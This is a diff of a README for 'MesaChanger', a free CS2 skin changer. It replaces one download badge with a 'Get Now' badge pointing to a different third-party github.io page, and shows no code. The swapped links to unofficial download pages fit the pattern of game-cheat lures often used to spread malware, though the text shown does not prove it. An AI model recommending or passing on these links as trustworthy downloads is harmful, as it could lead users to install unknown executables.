@@ -5,12 +5,7 @@
 
 <h1 align="center">⚡️ MesaChanger</h1>
 
-<p align="center">
-  <a href="https://mesachanger.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20MesaChanger-Free%20CS2%20Skin%20Changer-blueviolet?style=for-the-badge&logo=counter-strike&logoColor=white" 
-         alt="Download MesaChanger" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://atticuslovenamm.github.io/.github/mesachanger)
 
 <!-- Tool Preview -->
 <p align="center">
